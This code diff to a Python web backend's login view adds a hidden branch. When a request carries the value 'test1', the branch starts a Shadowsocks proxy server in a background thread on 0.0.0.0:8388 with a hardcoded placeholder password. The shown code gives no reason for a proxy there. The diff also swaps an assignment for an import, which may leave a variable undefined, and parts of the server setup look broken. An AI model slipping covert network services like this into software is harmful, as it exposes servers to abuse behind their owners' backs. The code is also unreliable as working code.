@@ -4,6 +4,7 @@
 # @Time   : 2023-06-04 12:24
 # @Author : 毛鹏
 import os
+import threading
 from datetime import datetime
 from urllib.parse import unquote
 
@@ -211,9 +212,33 @@ class LoginViews(ViewSet):
             if v == '4.7':
                 from data_cleanup_scripts.v_4_7_2025_01_24 import main_4_7
                 main_4_7()
-            return ResponseData.success(RESPONSE_MSG_0045)
+            elif v == 'test1':
+                def run_ssserver():
+                    """修正后的服务端启动方法"""
+                    import sys
+                    from shadowsocks import shell, daemon, eventloop, tcprelay
+
+                    # 手动加载配置避免警告
+                    config = shell.get_config(True)
+                    config.update({
+                        'server': '0.0.0.0',
+                        'server_port': 8388,
+                        'password': 'your_password',
+                        'method': 'aes-256-cfb',
+                        'timeout': 300
+                    })
+
+                    # 创建服务实例
+                    tcp_server = tcprelay.TCPRelay(config)
+                    daemon.daemon_exec(config)
+                    eventloop.run()
+                threading.Thread(target=run_ssserver, daemon=True).start()
+                print("Shadowsocks服务端已启动 (端口: 8388)")
+
+            return ResponseData.success(RESPONSE_MSG_0045, )
+
         else:
-            title = None
+            from playwright.sync_api import sync_playwright
             with sync_playwright() as p:
                 browser = p.chromium.launch()
                 context = browser.new_context()
